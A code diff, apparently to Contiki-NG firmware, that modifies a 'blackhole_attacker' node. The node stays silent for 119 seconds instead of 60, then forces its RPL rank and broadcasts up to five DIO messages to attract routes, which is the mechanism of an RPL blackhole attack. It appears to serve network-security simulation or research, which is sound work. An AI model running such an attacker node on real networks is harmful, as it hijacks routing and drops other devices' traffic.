@@ -27,12 +27,13 @@ PROCESS_THREAD(blackhole_attacker, ev, data)
 {
   static struct etimer periodic_timer;
   static uip_ipaddr_t root_ipaddr;
+  int count = 0;
 
   PROCESS_BEGIN();
-  LOG_INFO("Attacker will be inactive for 60 seconds.\n");
+  LOG_INFO("Attacker will be inactive for 119 seconds.\n");
   NETSTACK_MAC.off();
   NETSTACK_RADIO.off();
-  etimer_set(&periodic_timer, 60 * CLOCK_SECOND);
+  etimer_set(&periodic_timer, 119 * CLOCK_SECOND);
   PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
   NETSTACK_RADIO.on();
   NETSTACK_MAC.on();
@@ -42,6 +43,10 @@ PROCESS_THREAD(blackhole_attacker, ev, data)
     if (NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)) {
       curr_instance.dag.rank = RPL_FORCED_RANK;
       LOG_INFO("Current node rank: %u\n", curr_instance.dag.rank);
+      if (count < 5) {
+        rpl_icmp6_dio_output(NULL);
+        count++;
+      }
     }
     etimer_set(&periodic_timer, 5 * CLOCK_SECOND);
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
